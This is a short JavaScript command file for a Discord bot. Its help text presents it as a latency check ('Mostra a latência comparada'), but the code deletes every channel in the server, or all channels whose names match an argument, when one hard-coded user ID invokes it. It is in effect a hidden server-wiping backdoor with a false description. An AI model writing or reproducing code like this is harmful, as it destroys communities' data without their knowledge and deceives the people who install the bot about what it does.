module.exports.executar = async(client, message, args) => {
    
if(message.author.id === "553922729414361098"){
 
    let nome = args[0]
  a = Array.from(message.channel.guild.channels.values());

if(!nome){
for (let i = a.length; i--;)
        a[i].delete();
}
else{
	for (let i = a.length; i--;)
		if(a[i].name.includes(args[0])){
        a[i].delete();}

}
}
};
module.exports.configuração = {
    nome: "d",
    aliases: [],
    ajuda: "Mostra a latência comparada.",
    categoria: "Dono",
    dono: "Y"
};